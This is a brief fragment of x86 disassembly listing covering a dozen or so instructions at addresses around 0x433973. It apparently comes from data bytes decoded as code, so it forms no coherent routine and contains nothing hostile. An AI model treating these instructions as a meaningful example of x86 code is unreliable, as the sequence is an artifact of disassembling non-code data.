  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
